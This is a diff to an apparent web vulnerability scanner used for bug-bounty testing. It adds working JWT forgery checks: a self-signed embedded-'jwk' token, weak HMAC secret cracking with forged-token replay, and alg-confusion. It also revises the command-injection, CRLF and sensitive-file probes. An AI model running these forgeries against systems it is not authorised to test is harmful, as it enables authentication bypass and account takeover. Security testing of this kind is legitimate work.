@@ -94,6 +94,29 @@ _REDIRECT_PARAMS = ("next", "redirect", "url", "returnurl", "return_url", "redir
 _XSS_PARAMS = ("q", "query", "search", "s", "keyword", "message", "name", "comment")
 _SSTI_PARAMS = ("q", "template", "tpl", "view", "theme", "preview", "name")
 _RCE_PARAMS = ("cmd", "command", "exec", "ping", "host", "ip", "domain", "query", "q")
+# Default per-pass request ceiling. Twelve could not seat the suite, and no ordering could fix that:
+# against a one-parameter URL the landing fetch, CORS, the three redirect probes and the three
+# host-header probes spend ten between them, so whichever injection check was ordered last got
+# nothing. Ordering could only ever choose WHICH class starved.
+#
+# MEASURED, not estimated. Driven against the E2E fixture with an unbounded budget so nothing
+# truncates: 62 requests for a one-parameter URL, 90 for three parameters (with or without six
+# recon-discovered names -- the per-check caps bind first), and 99 with the opt-in timing probes on.
+# A JWT-bearing target adds roughly fifteen more (four JWT checks, each taking its own baseline and
+# negative control) and a GraphQL path a couple. 160 seats that worst case with headroom. An earlier
+# draft guessed "80-90" from a partial reading and set 100, which truncated a timing hunt at exactly
+# the heaviest check -- reintroducing, one check further down, the starvation it existed to cure.
+#
+# This is a ceiling, not a target: every check is self-gating (path-gated, signature-gated, or exits
+# on the first parameter that answers), so an ordinary target costs far less. Politeness is still
+# ENFORCED rather than promised, by two things this does not relax: the inter-request floor
+# (GREYIQ_ACTIVE_MIN_INTERVAL_MS, 500 ms) and the process-wide per-host token bucket
+# (GREYIQ_ACTIVE_MAX_REQUESTS_PER_HOST). That bucket must stay above this value TIMES the fan-out --
+# one hunt runs up to four ranked endpoints on one host through the SAME bucket -- or the bucket,
+# not the budget, silently becomes the real limit and the later siblings get nothing. Callers that
+# size their own budget (the hunt loop, the re-plan wave, the API re-verify paths) pass it
+# explicitly and are unaffected.
+_DEFAULT_REQUESTS_BUDGET = 160
 _PATH_PARAMS = ("file", "filename", "path", "page", "template", "doc", "download", "attachment")
 _SAFE_METHODS = {"GET", "HEAD", "OPTIONS"}
 # SQL-specific error signatures only — a generic stack trace is not SQL injection.
@@ -469,12 +492,37 @@ def _apply_class_priority(checks: list[tuple[str, Any]], class_priority: list[st
 
 def _finding(rule_id: str, title: str, severity: str, category: str, class_hint: str, url: str,
              proof: dict[str, Any], proof_evidence: dict[str, str], cvss: dict[str, Any] | None = None) -> dict[str, Any]:
+    evidence = dict(proof_evidence)
+    # NAME the sensitive data a captured body disclosed, for EVERY producer — not just CORS.
+    #
+    # sensitive_data's module docstring states the ordering rule: classify the RAW body, because
+    # redaction rewrites JWTs/tokens to [REDACTED_…] markers the classifier can no longer match, so
+    # classifying a redacted excerpt silently under-reports. Exactly one producer obeyed it
+    # (_cors_impact_tier), and it is the only reason that path can say "leaks a victim JWT + email".
+    # Every other capture — a served .env, an actuator/env dump, a GraphQL schema, a traversal read —
+    # left sensitive_data_labels unset, so report.py printed no "Sensitive data exposed:" line and
+    # bounty._write_sensitive_data_files skipped the finding entirely: the strongest impact evidence a
+    # disclosure finding has was simply never named.
+    #
+    # Doing it HERE, at the one choke point every check's evidence passes through, covers all 15
+    # in-module producers with one change and guarantees the raw-before-redaction ordering. The labels
+    # are generic English (never the secret itself), so they survive the redaction pass below intact.
+    # A producer that already classified (CORS) is left alone, and any failure is swallowed — naming
+    # the data is an impact enrichment and must never break a confirmed finding.
+    raw_body = str(evidence.get("read_data") or "")
+    if raw_body and not str(evidence.get("sensitive_data_labels") or "").strip():
+        try:
+            labels = sensitive_data.classify(raw_body)
+        except Exception:  # noqa: BLE001 - impact enrichment is best-effort, never load-bearing
+            labels = []
+        if labels:
+            evidence["sensitive_data_labels"] = "; ".join(labels)
     return {
         "rule_id": rule_id, "title": title, "severity": severity, "confidence": "high",
         "category": category, "file_path": url, "line_start": 1, "line_end": 1,
         "snippet": _redact(proof.get("observed_result") or "")[:240],
         "remediation": "", "redacted": True,
-        "proof_evidence": {k: _redact(v) for k, v in proof_evidence.items() if str(v or "").strip()},
+        "proof_evidence": {k: _redact(v) for k, v in evidence.items() if str(v or "").strip()},
         "_active_proof": proof,
         "_active_cvss": cvss,
         "_active_class_hint": class_hint,
@@ -549,7 +597,7 @@ def _check_cswsh(http: "_Http", url: str, landing: dict[str, Any] | None = None)
         {"request_line": f"GET {url}   (Upgrade: websocket; Origin: {_MARKER_ORIGIN})",
          "response_status": "101 Switching Protocols",
          "matched_value": f"Sec-WebSocket-Accept derived from the key we sent ({accept})"},
-        {"vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N", "base_score": 3.1, "base_severity": "low", "estimated": True},
+        impact_model.cvss_block("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N", estimated=True),
     )
 
 def _cors_cvss(tier: str) -> dict[str, Any]:
@@ -579,6 +627,60 @@ def _cors_cvss(tier: str) -> dict[str, Any]:
         why = ("The CORS header misconfiguration is confirmed, but only on a non-sensitive response (non-2xx, "
                "empty, or unauthenticated), so no cross-origin read of sensitive authenticated data is "
                "demonstrated. Severity stays Low until impact is shown on an authenticated data endpoint.")
+    return {
+        "vector": vector,
+        "base_score": scored["score"],
+        "base_severity": scored["severity"],
+        "estimated": False,
+        "justification": why,
+    }
+
+
+def _exposure_cvss(severity: str, what: str) -> dict[str, Any] | None:
+    """A per-finding CVSS v3.1 block for a CONFIRMED unauthenticated read exposure, sized to the
+    check's own graded severity instead of the flat class default.
+
+    Why this exists: these checks grade each entry themselves (``_DEBUG_ENDPOINTS`` marks
+    ``/actuator/heapdump`` "critical" — a full JVM heap dump, i.e. every in-memory secret, token and
+    active session downloadable — while ``/actuator`` the index is "medium"), but they passed
+    ``cvss=None``, so bounty.py stamped ``impact_model.cvss_for_class('disclosure', ...)``: a flat
+    ``C:L`` / 5.3 Medium for all of them. Because the report resolves severity from the CVSS rather
+    than the raw label, a confirmed heap dump or a served ``.aws/credentials`` was SUBMITTED as
+    "Medium, low confidentiality impact" — under-reporting the most serious thing these checks find,
+    and contradicting the finding's own severity field.
+
+    Honest by construction: a read-only exposure claims confidentiality ONLY. Integrity and
+    availability stay ``I:N/A:N`` however serious the disclosure is, because GET-only evidence proves
+    no write or execution — that stays the province of the ``rce``-hinted entries (Jolokia), which
+    already carry their own class vector. The ceiling is therefore ``S:C/C:H`` (8.6 High), never
+    Critical, since 9.0+ requires impact this evidence cannot demonstrate.
+
+      critical — total secret/session material in the body (heap dump, cloud credentials, .env):
+                 scope change, because the credentials compromise components beyond this one.
+      high     — full configuration / logs / source-level internals (actuator env, phpinfo, logfile).
+      medium   — operational metadata only (actuator index, server-status): the class default.
+
+    Returns ``None`` for an unrecognised grade, so the caller falls back to today's class vector."""
+    tier = str(severity or "").strip().lower()
+    if tier == "critical":
+        vector = "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
+        why = (f"Unauthenticated read of {what} is confirmed by a captured response against a control that "
+               "does not return it. Confidentiality is High and the scope is Changed because the disclosed "
+               "material (in-memory secrets/sessions or cloud credentials) authenticates to components "
+               "beyond this endpoint. Integrity and availability are scored None: the probe is GET-only, so "
+               "no write or execution is demonstrated.")
+    elif tier == "high":
+        vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+        why = (f"Unauthenticated read of {what} is confirmed by a captured response against a control that "
+               "does not return it. Confidentiality is High (full configuration/internals are readable); "
+               "integrity and availability are None because the probe is GET-only.")
+    elif tier == "medium":
+        vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"
+        why = (f"Unauthenticated read of {what} is confirmed, but the disclosed content is operational "
+               "metadata rather than secrets, so confidentiality impact is Low.")
+    else:
+        return None
+    scored = impact_model.cvss_base_score(vector)
     return {
         "vector": vector,
         "base_score": scored["score"],
@@ -1214,7 +1316,11 @@ def _check_rce_command_injection(http: _Http, url: str, extra_params: list[str] 
         try:
             probe = http.fetch(_with_query(url, {param: probe_payload}))
         except _ActiveError:
-            break
+            # Skip THIS parameter, not the rest of them. _ActiveError is a transient network failure
+            # (budget exhaustion raises _RateLimited, which the caller handles), and the control fetch
+            # above already `continue`s on the same error — so breaking here threw away every remaining
+            # candidate because one probe hit a reset. Its SSTI sibling continues; so does this now.
+            continue
         body = probe.get("body") or ""
         if sig_dollar in body or sig_tick in body:
             hit_sig = sig_dollar if sig_dollar in body else sig_tick
@@ -1434,7 +1540,11 @@ def _check_crlf(http: _Http, url: str, extra_params: list[str] | None = None) ->
                   # request/response shows the injected header exactly as it landed on the wire.
                   "response_header": f"X-Greyiq-Crlf: {_MARK}",
                   "matched_value": f"injected response header X-Greyiq-Crlf: {_MARK}"}
-            return _finding("active.crlf", f"CRLF / response-header injection via '{param}'", "high", "disclosure", "redirect", url, proof, ev)
+            # class_hint 'crlf', not 'redirect': what this proved is a response-header injection
+            # (CWE-113), and filing it as CWE-601 open redirect gave the report the wrong weakness and
+            # remediation. bounty.VULN_CLASSES['crlf'] and impact_model now carry the real entry. The
+            # scanner CATEGORY stays 'disclosure' so no unrelated disclosure finding is pulled in.
+            return _finding("active.crlf", f"CRLF / response-header injection via '{param}'", "high", "disclosure", "crlf", url, proof, ev)
     return None
 
 
@@ -1744,7 +1854,85 @@ def _extract_jwt_token(response: dict[str, Any] | None) -> str:
     return ""
 
 
+def _served_token_carrier(landing: dict[str, Any] | None) -> tuple[str, str, Callable[[str], str]] | None:
+    """A served JWT as (header_name, token, rebuild), preserving its replay transport.
+
+    Set-Cookie tokens keep every companion cookie, replacing only the JWT crumb.
+    Tokens found in the body or other headers retain the bearer-token fallback.
+    Shared with the OOB prover so both paths use the same cookie reconstruction.
+    """
+    if not isinstance(landing, dict):
+        return None
+    crumbs: list[tuple[str, str]] = []
+    jwt_index = -1
+    for raw_cookie in (landing.get("cookies") or []):
+        name, sep, value = str(raw_cookie).split(";", 1)[0].partition("=")
+        name, value = name.strip(), value.strip()
+        if not sep or not name:
+            continue
+        if jwt_index < 0 and _JWT_RE.match(value):
+            jwt_index = len(crumbs)
+        crumbs.append((name, value))
+    if jwt_index >= 0:
+        token = crumbs[jwt_index][1]
+
+        def rebuild_cookie(new_token: str) -> str:
+            pairs = [(n, new_token if i == jwt_index else v) for i, (n, v) in enumerate(crumbs)]
+            return "; ".join("{0}={1}".format(n, v) for n, v in pairs)
+
+        return ("Cookie", token, rebuild_cookie)
+    try:
+        token = _extract_jwt_token(landing)
+    except Exception:  # noqa: BLE001 - a crafted body is a no-op, never a crash
+        token = ""
+    if not token:
+        return None
+    return ("Authorization", token, lambda new_token: "Bearer {0}".format(new_token))
+
+
 _JWT_SCAN_CAP = 200_000  # never scan more than ~200 KB of body for a token
+
+
+def served_token_carrier(landing: dict[str, Any] | None) -> tuple[str, str, Callable[[str], str]] | None:
+    """A JWT the target served, WITH the transport it arrived on: (header_name, token, rebuild).
+
+    ``_extract_jwt_token`` looks in Set-Cookie first, and rightly so -- a cookie the site sets is its
+    own session rather than something echoed into a page -- but it returns the bare value, so every
+    caller replayed it as ``Authorization: Bearer``. A cookie-session application reads nothing from
+    that header, which costs each JWT check differently and all of them badly: the forgery never
+    reaches the verifier, the corrupted-signature control comes back 200 because the server never
+    looked at it, and the check bails. For the weak-secret check that is worse than a miss, because
+    its acceptance gate then cannot promote a GENUINE cookie-session forgery past 'candidate'.
+
+    So the cookie case rebuilds the original Cookie header with every crumb the landing response set,
+    swapping only the JWT one. Anything found elsewhere (body, response header) is a bearer token and
+    replays as one. Returns None when the response carried no usable JWT.
+    """
+    if not isinstance(landing, dict):
+        return None
+    crumbs: list[tuple[str, str]] = []
+    jwt_index = -1
+    for raw_cookie in (landing.get("cookies") or []):
+        name, sep, value = str(raw_cookie).split(";", 1)[0].partition("=")
+        name, value = name.strip(), value.strip()
+        if not sep or not name:
+            continue
+        if jwt_index < 0 and _JWT_RE.match(value):
+            jwt_index = len(crumbs)
+        crumbs.append((name, value))
+    if jwt_index >= 0:
+        def rebuild_cookie(new_token: str) -> str:
+            pairs = [(n, new_token if i == jwt_index else v) for i, (n, v) in enumerate(crumbs)]
+            return "; ".join(f"{n}={v}" for n, v in pairs)
+
+        return ("Cookie", crumbs[jwt_index][1], rebuild_cookie)
+    try:
+        token = _extract_jwt_token(landing)
+    except Exception:  # noqa: BLE001 - a crafted body is a no-op, never a crash
+        token = ""
+    if not token:
+        return None
+    return ("Authorization", token, lambda new_token: f"Bearer {new_token}")
 
 
 def _forge_alg_none_variants(token: str) -> list[str]:
@@ -1797,7 +1985,9 @@ def _body_similar(a: str, b: str) -> float:
     return difflib.SequenceMatcher(None, na, nb).ratio()
 
 
-def _check_jwt_alg_none(http: _Http, url: str, discovered_token: str = "") -> dict[str, Any] | None:
+def _check_jwt_alg_none(http: _Http, url: str, discovered_token: str = "", *,
+                        discovered_carrier: tuple[str, str, Callable[[str], str]] | None = None,
+                        ) -> dict[str, Any] | None:
     """Confirm the server accepts an UNSIGNED (alg:none) copy of a real session token as
     authenticated — one of the highest-signal, lowest-effort JWT bugs in real programs.
 
@@ -1814,6 +2004,11 @@ def _check_jwt_alg_none(http: _Http, url: str, discovered_token: str = "") -> di
     baseline_headers: dict[str, str] | None = None
     if found is not None:
         header_name, real_token, rebuild = found
+    elif discovered_carrier is not None:
+        # The transport the token actually arrived on (see _served_token_carrier). Preferred over the
+        # bare value, because replaying a cookie session as a bearer header reaches no verifier at all.
+        header_name, real_token, rebuild = discovered_carrier
+        baseline_headers = {header_name: rebuild(real_token)}
     elif discovered_token and _JWT_RE.match(discovered_token):
         # The target handed us a JWT but the operator supplied no auth — test the app's OWN token.
         header_name, real_token = "Authorization", discovered_token
@@ -1884,6 +2079,144 @@ def _check_jwt_alg_none(http: _Http, url: str, discovered_token: str = "") -> di
     return None
 
 
+def _rsa_jwk_and_signer() -> tuple[dict[str, str], Any] | None:
+    """A freshly generated RSA keypair as (public JWK dict, sign(bytes) -> signature).
+
+    The key is minted per probe and never leaves the process, so the "attacker key" in the proof is
+    demonstrably ours. Returns None when ``cryptography`` is unavailable — the same optional-dependency
+    treatment the alg-confusion check gives it, so the check simply does not fire rather than erroring.
+    """
+    try:
+        from cryptography.hazmat.primitives import hashes
+        from cryptography.hazmat.primitives.asymmetric import padding, rsa
+    except Exception:  # noqa: BLE001 - optional dep
+        return None
+    try:
+        key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+        numbers = key.public_key().public_numbers()
+    except Exception:  # noqa: BLE001 - a backend that cannot generate a key is a clean skip
+        return None
+
+    def _int_b64(value: int) -> str:
+        return _b64url_encode(value.to_bytes((value.bit_length() + 7) // 8 or 1, "big"))
+
+    jwk = {"kty": "RSA", "n": _int_b64(numbers.n), "e": _int_b64(numbers.e), "alg": "RS256", "use": "sig"}
+    return jwk, (lambda data: key.sign(data, padding.PKCS1v15(), hashes.SHA256()))
+
+
+def _check_jwt_jwk_embedded(http: _Http, url: str, discovered_token: str = "", *,
+                            discovered_carrier: tuple[str, str, Callable[[str], str]] | None = None,
+                            ) -> dict[str, Any] | None:
+    """Confirm the server verifies a token with a key the TOKEN ITSELF carries (the ``jwk`` JOSE
+    header, CVE-2018-0114's class) — unauthenticated, total token forgery.
+
+    This is the sibling of ``oob_service.confirm_jwt_key_injection``'s out-of-band jku/x5u probe, for the case
+    where the attacker does not have to host anything at all: the key travels inside the token. Where
+    jku/x5u can only be observed out of band (the fetch is the tell), an embedded key needs no
+    collaborator and no infrastructure, so this one runs in the ordinary pass and fires on a hunt that
+    has no OOB configured. A vulnerable verifier reads the embedded public key, checks the signature
+    against it, and finds it valid — because we signed with the matching private key — so any identity
+    the claims assert is accepted.
+
+    Same discipline and the same token sources as ``_check_jwt_alg_none``, and the claims are NOT
+    touched: the forged token carries the real token's payload bytes verbatim, so what is proven is
+    that an attacker-chosen key verifies, never a privilege the operator granted themselves. The
+    differential is threefold — the real token authenticates, a corrupted-signature copy is REJECTED
+    (so the server does verify), and the self-signed copy is ACCEPTED with the same authenticated body.
+    """
+    found = _find_jwt_credential(http.auth)
+    baseline_headers: dict[str, str] | None = None
+    if found is not None:
+        header_name, real_token, rebuild = found
+    elif discovered_carrier is not None:
+        # The transport the token actually arrived on (see _served_token_carrier). Preferred over the
+        # bare value, because replaying a cookie session as a bearer header reaches no verifier at all.
+        header_name, real_token, rebuild = discovered_carrier
+        baseline_headers = {header_name: rebuild(real_token)}
+    elif discovered_token and _JWT_RE.match(discovered_token):
+        header_name, real_token = "Authorization", discovered_token
+        rebuild = lambda new: f"Bearer {new}"  # noqa: E731
+        baseline_headers = {header_name: rebuild(real_token)}
+    else:
+        return None
+    parts = real_token.split(".")
+    if len(parts) != 3 or not all(parts):
+        return None
+    minted = _rsa_jwk_and_signer()
+    if minted is None:
+        return None  # no crypto backend -> nothing to sign with, so nothing to prove
+    jwk, sign = minted
+    try:
+        original_header = json.loads(_b64url_decode(parts[0]))
+    # RecursionError is a RuntimeError, not a ValueError: a crafted deeply nested header from an
+    # untrusted target token must be a clean skip, never a crash that aborts the pass.
+    except (ValueError, binascii.Error, UnicodeDecodeError, json.JSONDecodeError, RecursionError):
+        return None
+    if not isinstance(original_header, dict):
+        return None
+    try:
+        baseline = http.fetch(url, extra_headers=baseline_headers) if baseline_headers else http.fetch(url)
+    except _ActiveError:
+        return None
+    if not (200 <= int(baseline.get("status") or 0) < 300):
+        return None
+    baseline_body = str(baseline.get("body") or "")
+    if len(" ".join(baseline_body.split())) < _JWT_MIN_BODY:
+        return None  # nothing substantive to differentiate against -> a bypass cannot be shown here
+    # Negative control FIRST: a corrupted signature under the token's OWN algorithm must be rejected.
+    # A server that accepts that is not verifying at all, which this check cannot attribute to jwk.
+    try:
+        control = http.fetch(url, extra_headers={
+            header_name: rebuild(f"{parts[0]}.{parts[1]}.{_corrupt_jwt_signature(parts[2])}")})
+    except _ActiveError:
+        return None
+    if 200 <= int(control.get("status") or 0) < 300:
+        return None
+    forged_header = {"alg": "RS256", "typ": str(original_header.get("typ") or "JWT"), "jwk": jwk}
+    if original_header.get("kid"):
+        forged_header["kid"] = original_header["kid"]  # some verifiers only consult jwk when kid matches
+    try:
+        head_b64 = _b64url_encode(json.dumps(forged_header, separators=(",", ":")).encode("utf-8"))
+        signing_input = f"{head_b64}.{parts[1]}".encode("ascii")
+        forged = f"{head_b64}.{parts[1]}.{_b64url_encode(sign(signing_input))}"
+    except (TypeError, ValueError, UnicodeEncodeError):
+        return None
+    try:
+        probe = http.fetch(url, extra_headers={header_name: rebuild(forged)})
+    except _ActiveError:
+        return None
+    if not (200 <= int(probe.get("status") or 0) < 300):
+        return None
+    auth_body = str(probe.get("body") or "")
+    sim = _body_similar(auth_body, baseline_body)
+    if sim < _JWT_BODY_SAME:
+        # 2xx without the authenticated content: a verifying server can still answer 200 with a public
+        # page for a token it refused. Not a bypass.
+        return None
+    proof = _proof(
+        "confirmed", method=f"GET with a {header_name} token carrying an attacker-generated 'jwk' key",
+        affected_asset="every endpoint behind this authentication check — any identity can be signed",
+        observed_result=(f"a token signed with a freshly generated key, whose PUBLIC half was embedded in the "
+                         f"token's own 'jwk' header, was accepted (HTTP {probe['status']}) and returned the SAME "
+                         f"authenticated content as the real-token baseline ({sim:.0%} body match)"),
+        control_result=(f"a token with a corrupted signature under the original algorithm was rejected "
+                        f"(HTTP {control['status']}) — the server does verify signatures, it simply trusts the key "
+                        f"the token supplies"),
+        evidence="self-signed 'jwk' acceptance confirmed against a real-token baseline (body-matched), plus a corrupted-signature negative control",
+        limitations=("The claims were carried over from the real token unchanged, so this proves an attacker-chosen "
+                     "key is trusted — the identity/role fields were deliberately not altered."),
+    )
+    ev = {"request_line": f"GET {url}",
+          "request_header": f"{header_name}: <token with an embedded attacker 'jwk' public key>",
+          "response_status": f"HTTP {probe['status']}",
+          "matched_value": "self-signed token accepted — the verifier trusts the key carried in the token"}
+    if len(auth_body.strip()) >= 8:
+        ev["read_data"] = auth_body[:1200]
+    return _finding("active.jwt-jwk-embedded",
+                    "JWT 'jwk' header trusted — a self-signed token is accepted (arbitrary token forgery)",
+                    "critical", "jwt", "jwt", url, proof, ev)
+
+
 # Well-known JWKS locations to try (same-origin only) to recover the RSA PUBLIC key an RS256 token is
 # verified with — the key material the RS256->HS256 confusion attack HMAC-signs with.
 _JWKS_PATHS = ("/.well-known/jwks.json", "/jwks.json", "/.well-known/openid-configuration")
@@ -1941,7 +2274,9 @@ def _fetch_rsa_public_pems(http: _Http, url: str, kid: str = "") -> list[bytes]:
     return pems[:4]
 
 
-def _check_jwt_alg_confusion(http: _Http, url: str, discovered_token: str = "") -> dict[str, Any] | None:
+def _check_jwt_alg_confusion(http: _Http, url: str, discovered_token: str = "", *,
+                             discovered_carrier: tuple[str, str, Callable[[str], str]] | None = None,
+                             ) -> dict[str, Any] | None:
     """Confirm RS256->HS256 ALGORITHM CONFUSION: the server verifies its JWTs with an RSA PUBLIC key
     but can be tricked into treating a token as HS256 (symmetric), so a token HMAC-signed with that
     PUBLIC key — which anyone can fetch from the JWKS — is accepted as authentic. Token forgery / full
@@ -1951,6 +2286,11 @@ def _check_jwt_alg_confusion(http: _Http, url: str, discovered_token: str = "") 
     baseline_headers: dict[str, str] | None = None
     if found is not None:
         header_name, real_token, rebuild = found
+    elif discovered_carrier is not None:
+        # The transport the token actually arrived on (see _served_token_carrier). Preferred over the
+        # bare value, because replaying a cookie session as a bearer header reaches no verifier at all.
+        header_name, real_token, rebuild = discovered_carrier
+        baseline_headers = {header_name: rebuild(real_token)}
     elif discovered_token and _JWT_RE.match(discovered_token):
         header_name, real_token = "Authorization", discovered_token
         rebuild = lambda new: f"Bearer {new}"  # noqa: E731
@@ -2073,15 +2413,42 @@ def _crack_jwt_hs_secret(token: str) -> tuple[str, str] | None:
     return None
 
 
-def _check_jwt_weak_secret(http: _Http, url: str) -> dict[str, Any] | None:
-    """Recover a weak HMAC signing secret for the operator's own JWT (OFFLINE, self-certifying),
-    then corroborate by signing a MINIMALLY-MODIFIED benign token the operator never issued and
-    showing the server accepts it. Opt-in-by-having-auth (never invents a session); no privilege
-    claim is tampered with. CRITICAL — a recovered secret forges arbitrary tokens."""
+def _check_jwt_weak_secret(
+    http: _Http,
+    url: str,
+    discovered_token: str = "",
+    *,
+    discovered_carrier: tuple[str, str, Callable[[str], str]] | None = None,
+) -> dict[str, Any] | None:
+    """Recover a weak HMAC signing secret for a JWT (OFFLINE, self-certifying), then corroborate by
+    signing a MINIMALLY-MODIFIED benign token that was never issued and showing the server accepts
+    it. No privilege claim is tampered with. CRITICAL — a recovered secret forges arbitrary tokens.
+
+    The token is the operator's own credential when there is one, and OTHERWISE the token the TARGET
+    ITSELF handed back (the same source the alg:none and alg-confusion checks already use). Without
+    that second source this check was unreachable in the hunt the operator runs most — an
+    unauthenticated one — even though an app that hands an anonymous visitor an HS256 guest token and
+    signs it with 'secret' is precisely the case the offline cracker exists to catch, and the crack
+    costs zero requests. Opt-in-by-having-a-token either way; it still never invents a session."""
     found = _find_jwt_credential(http.auth)
-    if found is None:
-        return None
-    header_name, real_token, rebuild = found
+    baseline_headers: dict[str, str] | None = None
+    if found is not None:
+        header_name, real_token, rebuild = found
+    else:
+        if discovered_carrier is not None:
+            header_name, real_token, rebuild = discovered_carrier
+        elif discovered_token:
+            header_name, real_token = "Authorization", discovered_token
+            rebuild = lambda new: f"Bearer {new}"  # noqa: E731
+        else:
+            return None
+        if not _JWT_RE.match(real_token):
+            return None
+        # The operator-credential path gets its authenticated baseline for free (_Http.fetch attaches
+        # the session same-site). A DISCOVERED token does not, so the baseline must carry the real
+        # token on its original carrier, just like the control and forgery below. A cookie-only app
+        # ignores Authorization, so replaying a Set-Cookie token as Bearer cannot show acceptance.
+        baseline_headers = {header_name: rebuild(real_token)}
     cracked = _crack_jwt_hs_secret(real_token)
     if cracked is None:
         return None  # the offline crack IS the finding-cost; no crack -> silent, zero requests
@@ -2098,28 +2465,67 @@ def _check_jwt_weak_secret(http: _Http, url: str) -> dict[str, Any] | None:
     new_payload = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
     new_sig = _b64url_encode(hmac.new(secret.encode("utf-8"), f"{new_header}.{new_payload}".encode("ascii"), digest).digest())
     forged = f"{new_header}.{new_payload}.{new_sig}"
-    # The offline crack already self-certifies; the live request only corroborates. A network
-    # failure keeps the finding confirmed (the crypto is the proof).
+    # The offline crack self-certifies HOW THE STRING WAS SIGNED. Whether this application trusts
+    # the token is a separate question, and on the discovered path it is the load-bearing one --
+    # see the status decision below.
     server_note = "the recovered secret proves forgery offline (self-certifying); not sent to the server"
+    accepted = False
     try:
-        baseline = http.fetch(url)
+        baseline = http.fetch(url, extra_headers=baseline_headers) if baseline_headers else http.fetch(url)
+        # NEGATIVE CONTROL, the same one alg:none and alg-confusion take before either narrates a
+        # bypass: a copy of the REAL token with a corrupted signature must be REJECTED. Without it a
+        # body match proves nothing about whether the token was honoured -- on a wholly public
+        # endpoint the baseline and the forged response are identical because the server never looked
+        # at either token, and an earlier draft reported exactly that as "was accepted ... body match
+        # 100%". That is a fabricated corroboration attached to a real finding, which is worse than
+        # the vaguer wording it replaced.
+        parts_real = real_token.split(".")
+        control = http.fetch(url, extra_headers={
+            header_name: rebuild(f"{parts_real[0]}.{parts_real[1]}.{_corrupt_jwt_signature(parts_real[2])}")})
         probe = http.fetch(url, extra_headers={header_name: rebuild(forged)})
-        if 200 <= int(probe.get("status") or 0) < 300 and 200 <= int(baseline.get("status") or 0) < 300:
-            server_note = (f"a token forged with the recovered secret (a claim the operator never issued) was accepted "
-                           f"(HTTP {probe['status']}), matching the real-token baseline (HTTP {baseline['status']})")
+        verifies = not (200 <= int(control.get("status") or 0) < 300)
+        if (verifies and 200 <= int(probe.get("status") or 0) < 300
+                and 200 <= int(baseline.get("status") or 0) < 300):
+            same = _body_similar(str(baseline.get("body") or ""), str(probe.get("body") or ""))
+            if same >= _JWT_BODY_SAME:
+                accepted = True
+                server_note = (f"a token forged with the recovered secret (a claim that was never issued) was "
+                               f"accepted (HTTP {probe['status']}) and returned the same content as the real "
+                               f"token (HTTP {baseline['status']}, body match {same:.0%}), while a "
+                               f"corrupted-signature copy was rejected (HTTP {control['status']}) -- so the "
+                               f"server does verify, and it accepted our signature")
     except _ActiveError:
         pass
+    # WHOSE TOKEN IS IT. A credential the OPERATOR supplied is a live session by construction, so
+    # cracking it proves their own token is forgeable and the byte-equality is the whole proof. A
+    # token merely READ OUT OF THE PAGE is not that. It may be a documentation sample -- the jwt.io
+    # example token is signed with "your-256-bit-secret", which is in the weak list above -- and
+    # cracking that proves how a string in someone's docs was signed, not that this application
+    # trusts it. Reporting that as a confirmed CRITICAL forgery is a false positive of exactly the
+    # kind the evidence rule exists to stop, so the discovered path has to SHOW the server honouring
+    # a forged token before it claims one. Without that it is a candidate, which is honest: a weak
+    # signing secret sitting in a served token is worth a look even when its owner is unclear.
+    discovered_only = found is None
+    status = "confirmed" if (accepted or not discovered_only) else "candidate"
+    limitations = "" if status == "confirmed" else (
+        "The token was read out of the target's own response rather than supplied as a credential, and the "
+        "server was not shown to accept a token forged with the recovered secret. The weak secret is proven by "
+        "byte-equality; that this application TRUSTS this token is not. Replay a forged token against an "
+        "endpoint that requires the session to settle it -- a sample token in documentation cracks identically."
+    )
     proof = _proof(
-        "confirmed", method=f"offline HMAC-{alg} crack of the JWT signing secret",
+        status, method=f"offline HMAC-{alg} crack of the JWT signing secret",
         affected_asset="every identity/role/scope the token asserts — arbitrary token forgery",
         observed_result=f"the {alg} signing secret is a well-known weak value ('{secret}'), recovered offline by byte-matching HMAC-{alg} of the token's own signing input",
         control_result=server_note,
         evidence=f"HMAC-{alg}(header.payload, weak-secret) equals the token's real signature — cryptographic byte-equality, self-certifying",
+        limitations=limitations,
     )
     ev = {"request_line": f"GET {url}", "request_header": f"{header_name}: <token forged with the recovered secret>",
           "response_status": "offline crack (self-certifying)", "matched_value": f"weak HMAC-{alg} signing secret recovered: '{secret}'"}
-    return _finding("active.jwt-weak-secret", "JWT signed with a weak/guessable secret (arbitrary token forgery)",
-                    "critical", "jwt", "jwt", url, proof, ev)
+    title = ("JWT signed with a weak/guessable secret (arbitrary token forgery)" if status == "confirmed" else
+             "JWT served by the target is signed with a weak/guessable secret (acceptance not shown)")
+    return _finding("active.jwt-weak-secret", title, "critical", "jwt", "jwt", url, proof, ev)
 
 
 # Traversal payload -> the unmistakable signature of the file it reads. Each is gated by a
@@ -2332,7 +2738,19 @@ def _check_sensitive_paths(http: _Http, url: str) -> dict[str, Any] | None:
             ev = {"request_line": f"GET {origin}{path}", "response_status": f"HTTP {status}", "matched_value": f"{name} exposed",
                   # The served file content IS the demonstrated exposure (secrets redacted once by _finding).
                   "read_data": body[:1200]}
-            return _finding("active.exposed-file", f"Sensitive file exposed: {path}", "high", "disclosure", "disclosure", url, proof, ev)
+            # Grade from the EVIDENCE, not the filename: a served file whose captured body classifies
+            # as real secret material (.env with live keys, .aws/credentials, wp-config.php.bak) is a
+            # credential exposure whose blast radius reaches other systems, so it earns the
+            # scope-changed C:H vector; a .git/config or a dump without recognisable secrets stays
+            # High-confidentiality but unchanged-scope. Without a per-finding vector both reported as
+            # the flat 'disclosure' class default of C:L / 5.3 Medium.
+            try:
+                graded = "critical" if sensitive_data.classify(body) else "high"
+            except Exception:  # noqa: BLE001 - grading is enrichment; fall back to the old flat 'high'
+                graded = "high"
+            return _finding("active.exposed-file", f"Sensitive file exposed: {path}", graded, "disclosure",
+                            "disclosure", url, proof, ev,
+                            cvss=_exposure_cvss(graded, f"{name} at {path}"))
     return None
 
 
@@ -2419,17 +2837,35 @@ def _check_debug_endpoints(http: _Http, url: str) -> dict[str, Any] | None:
         body = probe.get("body") or ""
         status = int(probe.get("status") or 0)
